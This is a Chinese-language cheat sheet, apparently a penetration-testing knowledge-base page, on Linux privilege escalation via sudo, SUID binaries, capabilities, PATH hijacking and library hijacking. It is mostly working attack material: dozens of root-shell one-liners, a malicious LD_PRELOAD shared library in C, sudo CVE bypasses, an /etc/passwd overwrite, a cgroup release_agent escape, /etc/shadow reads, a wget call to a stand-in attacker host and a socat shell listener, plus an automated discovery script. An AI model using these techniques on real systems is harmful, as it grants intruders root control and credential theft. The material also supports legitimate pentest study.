# Linux SUDO/SUID/Capabilities — 配置滥用提权

> 拿到 www-data 后，第一条路永远不是内核 exploit——而是检查管理员留下的捷径。`sudo -l` 的一个 NOPASSWD 条目、一个异常 SUID 二进制、一个被赠予的 capability——就足以直达 root。

## 关键词

`SUDO` `sudo -l` `NOPASSWD` `LD_PRELOAD` `env_keep` `sudoedit` `SUID` `SGID` `GTFOBins` `find提权` `vim提权` `bash提权` `python提权` `Capabilities` `cap_sys_admin` `cap_dac_read_search` `cap_setuid` `getcap` `setcap` `PATH劫持` `PATH注入` `相对路径` `library劫持` `sudo提权`

---

## 1. SUDO 滥用

### 1.1 信息收集

```bash
# 查看当前用户 SUDO 权限
sudo -l                     # 列出允许运行的命令
sudo -ll                    # 详细版（含 LD_PRELOAD 等）
sudo -V                     # SUDO 版本（找版本相关 CVE）

# SUDO 版本高危范围
# < 1.9.5p2 → CVE-2021-3156 (Baron Samedit)
# < 1.8.28 → CVE-2019-14287 (#-1 绕过)
# < 1.9.12p2 → CVE-2023-22809 (sudoedit 任意文件写)
```

### 1.2 SUDO 命令利用（GTFOBins 手册）

```bash
# 原则: sudo -l 列出的每一个命令都在 https://gtfobins.github.io 查

# ====== 常见提权命令 ======

# vim / vi
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.system("/bin/bash")'

# find
sudo find . -exec /bin/bash -p \; -quit

# less / more
sudo less /etc/hosts
# 输入: !/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# perl / python / ruby / php
sudo perl -e 'exec "/bin/bash";'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo ruby -e 'exec "/bin/bash"'

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip
sudo zip /tmp/a.zip /etc/hosts -T --unzip-command="sh -c /bin/bash"

# nmap (老版本有 --interactive)
sudo nmap --script /bin/bash
# 写 .nse 脚本: os.execute("/bin/bash")

# man / mandb
sudo man man
# :!/bin/bash

# git / hg
sudo git -p help config   # 进入 pager → !/bin/bash
sudo git branch --edit-description   # 进入编辑器 → :!/bin/bash

# systemctl / service
sudo systemctl
# !/bin/bash

# ssh
sudo ssh -o ProxyCommand='/bin/bash -i 0<&2 1>&2' x

# rsync
sudo rsync -e '/bin/bash -c "/bin/bash"' /dev/null x

# tcpdump
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /bin/bash -Z root
```

### 1.3 LD_PRELOAD 注入（env_keep 场景）

```bash
# sudo -l 输出: env_keep+=LD_PRELOAD
# 利用: 强制加载恶意 .so

# 编写恶意 so
cat > evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o evil.so evil.c -nostartfiles

# 执行
sudo LD_PRELOAD=/tmp/evil.so ANY_COMMAND
# → root shell
```

### 1.4 CVE-2019-14287（UID -1 绕过）

```bash
# sudo < 1.8.28 + ALL=(ALL,!root) 配置
# 用 UID -1 (等同于 4294967295) 绕过 !root 限制
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

### 1.5 CVE-2021-3156（Baron Samedit）

```bash
# sudo 1.8.31p2 / 1.9.5p1 堆溢出 → 直接 root
# 利用: https://github.com/blasty/CVE-2021-3156
./sudo-hax-me-a-sandwich 0   # Ubuntu 20.04
./sudo-hax-me-a-sandwich 1   # Ubuntu 18.04
./sudo-hax-me-a-sandwich 2   # Ubuntu 16.04
```

---

## 2. SUID / SGID 滥用

### 2.1 枚举

```bash
# 查找所有 SUID 二进制
find / -perm -4000 -type f -ls 2>/dev/null

# 查找所有 SGID 二进制
find / -perm -2000 -type f -ls 2>/dev/null

# 查找异常 SUID（排除标准系统文件）
find / -perm -4000 -type f -not -path '/usr/*' -not -path '/bin/*' -not -path '/sbin/*' 2>/dev/null

# 查找近期修改的 SUID
find / -perm -4000 -mtime -10 -type f 2>/dev/null
```

### 2.2 GTFOBins SUID 利用全集

```bash
# 原则: 每个 SUID 二进制 → https://gtfobins.github.io 查 SUID 部分

# ====== Shell / 解释器 ======
# bash (如果 bash -p 保留 euid)
bash -p
# 或拷贝到可控目录: cp /bin/bash /tmp/b; chmod u+s /tmp/b; /tmp/b -p

# python
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'

# php
php -r "posix_setuid(0); system('/bin/bash -p');"

# ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash -p"'

# ====== 系统工具 ======
# find
find . -exec /bin/bash -p \; -quit
touch xxx; find xxx -exec /bin/bash -p \;

# cp (覆盖 /etc/passwd)
openssl passwd -1 -salt x password123
# echo 'root2:hash:0:0:root:/root:/bin/bash' >> /tmp/passwd
# cp /tmp/passwd /etc/passwd

# mv (同 cp 思路: 移动恶意文件覆盖关键文件)

# tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# wget / curl (下载文件覆盖关键文件)
./wget http://attacker.com/shell -O /tmp/x

# dd (直接读写磁盘/覆盖文件)
dd if=/dev/sda of=/tmp/mbr bs=512 count=1  # 读取 MBR

# socat
./socat exec:'bash -p',pty,stderr tcp-listen:4444

# nmap (老版本 --interactive)
nmap --interactive → !/bin/bash
```

### 2.3 特殊 SUID 场景

```bash
# ====== 自定义 SUID wrapper ======
# 常见模式: 管理员写了个 C 程序调用 system() 且设置了 SUID
# strings /path/to/suid_binary  → 检查内部调用的命令
# 如果调用的是相对路径命令 (如 "cat file" 而不是 "/bin/cat file"):
# PATH 劫持: export PATH=/tmp:$PATH → 创建 /tmp/cat → /tmp/cat 内容为 /bin/bash

# ====== 环境变量注入 ======
# 许多 SUID 程序在不安全地使用环境变量
# LD_LIBRARY_PATH → 库劫持
# LD_PRELOAD → 库注入（通常 SUID 程序会清除，但不是全部）

# ====== 文件写入 SUID ======
# 如果是编辑器类 SUID (vim/emacs/nano/gvim)
vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
```

---

## 3. Linux Capabilities

### 3.1 枚举

```bash
# 当前进程 capabilities
cat /proc/$$/status | grep Cap
getpcaps $$

# 文件 capabilities
getcap -r / 2>/dev/null

# 解析 capabilities 位掩码
capsh --print
```

### 3.2 关键 Capability 利用

```bash
# ====== CAP_SYS_ADMIN ======
# 最危险的 capability，近乎 root 等效

# 挂载文件系统
mount -t cgroup -o none,name=test cgroup /tmp/cg
mkdir /tmp/cg/x; echo 1 > /tmp/cg/x/notify_on_release
echo '#!/bin/bash' > /tmp/exploit
echo '/bin/bash -p' >> /tmp/exploit
chmod +x /tmp/exploit
echo "/tmp/exploit" > /tmp/cg/release_agent   # 触发 → root

# 或用 unshare 创建新 namespace 后执行
unshare -Urm /bin/bash

# ====== CAP_DAC_READ_SEARCH ======
# 绕过所有文件读权限检查
# 读 /etc/shadow /root/.ssh/id_rsa 等
capsh --caps="cap_dac_read_search+eip" -- -c "cat /etc/shadow"

# ====== CAP_SETUID / CAP_SETGID ======
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# 或直接调用 setuid(0)

# ====== CAP_SYS_PTRACE ======
# 注入 root 进程
# 注入工具: https://github.com/0x00pf/p0wnedShell
python3 inject.py $(pgrep -f root_process)

# ====== CAP_SYS_MODULE ======
# 加载内核模块 → 直接 root
# 写一个简单内核模块 → insmod

# ====== CAP_SYS_RAWIO ======
# 直接读写 /dev/mem /dev/kmem → 修改内核内存 → root

# ====== CAP_NET_RAW ======
# 可用于各种网络工具 (tcpdump) → 但不是直接提权
```

---

## 4. PATH 劫持

```bash
# ====== 场景 1: Cron 脚本/SUID 程序使用相对路径 ======
# 如果有个 cron 任务执行 "backup.sh" 而不是 "/opt/backup.sh"
# 且 PATH 中 /tmp 在当前目录之前:
echo '#!/bin/bash' > /tmp/backup.sh
echo '/bin/bash -p' >> /tmp/backup.sh
chmod +x /tmp/backup.sh
# 等待 cron 执行

# ====== 场景 2: 修改当前 PATH ======
export PATH=/tmp:$PATH
# 如果 SUID 程序调用 "ls" 而不是 "/bin/ls"
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash -p' >> /tmp/ls
chmod +x /tmp/ls
./vuln_suid
```

### 4.1 自动化 PATH 探测

```bash
# 用 strace 追踪所有 execve 调用
strace -f -e trace=execve /path/to/vulnerable 2>&1 | grep execve

# 用 strings 找相对路径命令
strings /path/to/binary | grep -E '^[a-z]+$' | sort -u
# 出现的裸命令名 → PATH 劫持候选
```

---

## 5. Shared Library 劫持

### 5.1 枚举

```bash
# 查看 SUID 程序加载的库
ldd /path/to/suid_binary

# 寻找缺失的库（not found）
ldd /path/to/suid_binary | grep "not found"

# 查看 RUNPATH/RPATH
readelf -d /path/to/suid_binary | grep -E "RUNPATH|RPATH"

# 如果 RUNPATH 包含可写目录 → 库劫持
```

### 5.2 创建恶意库

```c
// 创建与缺失/可替换库同名的 so
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}

// 或劫持特定函数（如 suid 程序调用的某个函数）
void hijacked_function() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o libhijack.so hijack.c -nostartfiles
# 放到缺失库的目录或 RUNPATH 可写目录
# 执行 SUID 程序 → 库被加载 → root
```

---

## 6. 一键自动化：SUDO/SUID Peas 脚本

```python
#!/usr/bin/env python3
"""auto-pe.py — 自动化 SUDO + SUID 提权探测与利用"""
import subprocess, os, re, shlex

def run(cmd):
    return subprocess.getoutput(cmd)

def check_sudo():
    """检查 SUDO 权限"""
    out = run("sudo -l 2>/dev/null")
    if "NOPASSWD" in out:
        print(f"[!] SUDO NOPASSWD found!")
        print(out)
        # 逐行解析 sudo -l 输出
        for line in out.split('\n'):
            if '(' in line and 'NOPASSWD' in line:
                cmd = line.split(':')[0].strip()
                print(f"  → SUDO 命令: {cmd} → 查 GTFOBins: https://gtfobins.github.io/gtfobins/{cmd.split()[0]}/#sudo")
    elif "(ALL" in out or "(root" in out:
        print(f"[!] SUDO (需要密码):\n{out}")

def check_suid():
    """检查异常 SUID 二进制"""
    known_safe = {'su','sudo','mount','umount','ping','passwd','newgrp',
                  'chsh','chfn','gpasswd','pkexec','unix_chkpwd'}
    gtfobins_db = 'find vim bash python python3 perl ruby php tar zip less more awk nmap git man systemctl ssh rsync tcpdump socat cp mv wget curl dd docker'.split()
    
    suid = run("find / -perm -4000 -type f 2>/dev/null")
    for f in suid.split('\n'):
        name = os.path.basename(f)
        if name in gtfobins_db:
            print(f"[!] GTFOBins SUID: {f} → https://gtfobins.github.io/gtfobins/{name}/#suid")
        elif name not in known_safe:
            print(f"[?] 潜在异常 SUID: {f}")

def check_caps():
    out = run("getcap -r / 2>/dev/null")
    dangerous = ['cap_sys_admin','cap_sys_ptrace','cap_setuid','cap_setgid',
                 'cap_dac_read_search','cap_sys_module','cap_sys_rawio']
    for line in out.split('\n'):
        for cap in dangerous:
            if cap in line.lower():
                print(f"[!] 危险 Capability: {line}")

def check_path():
    """检查 PATH 劫持可能"""
    path = os.environ.get('PATH','')
    for d in path.split(':'):
        if os.access(d, os.W_OK):
            print(f"[!] 可写 PATH 目录: {d}")

if __name__ == '__main__':
    print("=== SUDO ==="); check_sudo()
    print("\n=== SUID ==="); check_suid()
    print("\n=== Capabilities ==="); check_caps()
    print("\n=== PATH ==="); check_path()
```

---

## 7. 关联技术

- [[02-linux-cron-service]] — Cron/服务/通配符注入
- [[03-linux-kernel-cve]] — 内核 CVE 提权
- [[00-overview]] — PE 全景（先走配置，再走 CVE）
